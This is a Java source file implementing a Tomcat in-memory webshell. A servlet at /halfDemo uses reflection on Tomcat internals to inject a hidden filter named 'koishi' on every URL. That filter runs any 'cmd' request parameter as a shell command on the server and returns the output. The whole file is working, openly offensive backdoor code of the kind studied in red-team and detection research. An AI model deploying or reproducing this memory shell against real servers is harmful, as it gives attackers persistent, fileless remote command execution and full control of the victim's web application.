package com.tomcat.memshell.TomcatEcho;

import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;

@WebServlet("/halfDemo")
public class TomcatEcho_Half_WithFilter extends HttpServlet {
    private final String cmdParamName = "cmd";
    private final static String filterUrlPattern = "/*";
    private final static String filterName = "koishi";

    protected void doPost(HttpServletRequest request, HttpServletResponse response) {
        try {
            Field wrap_same_object = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequest = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedRequest");
            Field lastServicedResponse = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedResponse");
            lastServicedRequest.setAccessible(true);
            lastServicedResponse.setAccessible(true);
            wrap_same_object.setAccessible(true);
            //修改final
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(wrap_same_object, wrap_same_object.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~Modifier.FINAL);

            boolean wrap_same_object1 = wrap_same_object.getBoolean(null);
            ThreadLocal<ServletRequest> requestThreadLocal = (ThreadLocal<ServletRequest>)lastServicedRequest.get(null);
            ThreadLocal<ServletResponse> responseThreadLocal = (ThreadLocal<ServletResponse>)lastServicedResponse.get(null);

            wrap_same_object.setBoolean(null,true);
            lastServicedRequest.set(null,new ThreadLocal<>());
            lastServicedResponse.set(null,new ThreadLocal<>());
            ServletResponse servletResponse = responseThreadLocal.get();
            ServletRequest servletRequest = requestThreadLocal.get();
            ServletContext servletContext = servletRequest.getServletContext();  //这里实际获取到的是ApplicationContextFacade
            if (servletContext!=null) {
                //编写恶意Filter
                class ShellIntInject implements javax.servlet.Filter{

                    @Override
                    public void init(FilterConfig filterConfig) throws ServletException {

                    }

                    @Override
                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                        System.out.println("start with cmd=");
                        String cmd = servletRequest.getParameter(cmdParamName);
                        if(cmd!=null) {
                            String[] cmds = null;

                            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                                cmds = new String[]{"cmd.exe", "/c", cmd};
                            } else {
                                cmds = new String[]{"sh", "-c", cmd};
                            }

                            java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                            java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                            String output = s.hasNext() ? s.next() : "";
                            java.io.Writer writer = servletResponse.getWriter();
                            writer.write(output);
                            writer.flush();
                            writer.close();
                        }
                        filterChain.doFilter(request, response);
                    }

                    @Override
                    public void destroy() {

                    }
                }
                //获取ApplicationContext
                Field context = servletContext.getClass().getDeclaredField("context");
                context.setAccessible(true);
                ApplicationContext ApplicationContext = (ApplicationContext)context.get(servletContext);
                //获取standardContext
                Field context1 = ApplicationContext.getClass().getDeclaredField("context");
                context1.setAccessible(true);
                StandardContext standardContext = (StandardContext) context1.get(ApplicationContext);
                //获取LifecycleBase的state修改为org.apache.catalina.LifecycleState.STARTING_PREP
                Field state = Class.forName("org.apache.catalina.util.LifecycleBase").getDeclaredField("state");
                state.setAccessible(true);
                state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);
                //注册filterName
                FilterRegistration.Dynamic registration = ApplicationContext.addFilter(filterName, new ShellIntInject());
                //添加拦截路径，实现是将存储写入到filterMap中
                registration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{"/*"});
                //调用filterStart方法将filterconfig进行添加
                Method filterStart = Class.forName("org.apache.catalina.core.StandardContext").getMethod("filterStart");
                filterStart.setAccessible(true);
                filterStart.invoke(standardContext,null);
                //移动filter为位置到前面
                FilterMap[] filterMaps = standardContext.findFilterMaps();
                for (int i = 0; i < filterMaps.length; i++) {
                    if (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)) {
                        org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMap;
                        break;
                    }
                }
                servletResponse.getWriter().write("TomcatEcho_HalfWithFilter injection successful!\nGo to /koishi with ParamName \"cmd\" for farther operation");
                state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

    }



    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);
    }
}

